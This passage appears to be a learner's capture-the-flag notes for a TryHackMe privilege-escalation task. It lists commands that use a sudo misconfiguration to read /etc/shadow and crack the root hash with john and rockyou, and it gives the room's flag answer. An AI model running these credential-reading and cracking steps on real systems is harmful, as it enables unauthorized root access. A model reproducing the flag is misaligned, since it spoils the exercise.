Now, we need to escalate our privileges.

Answer the questions below

| Question                                                                   | Answer | SS  |
| -------------------------------------------------------------------------- | ------ | --- |
| Find a form to escalate your privileges.  <br>What is the root's password? |        |     |
```
sudo -l
```
![[Pasted image 20240316200714.png]]

```
sudo /bin/cat /etc/shadow
```
![[Pasted image 20240316201752.png]]

*Save the pass to a file and crack it using john:*

```
john root_bruteit --wordlist=/usr/share/wordlists/rockyou.txt
```
![[Pasted image 20240316201707.png]]


| Question | Answer                    | SS                                   |
| -------- | ------------------------- | ------------------------------------ |
| root.txt | THM{pr1v1l3g3_3sc4l4t10n} | ![[Pasted image 20240316202216.png]] |
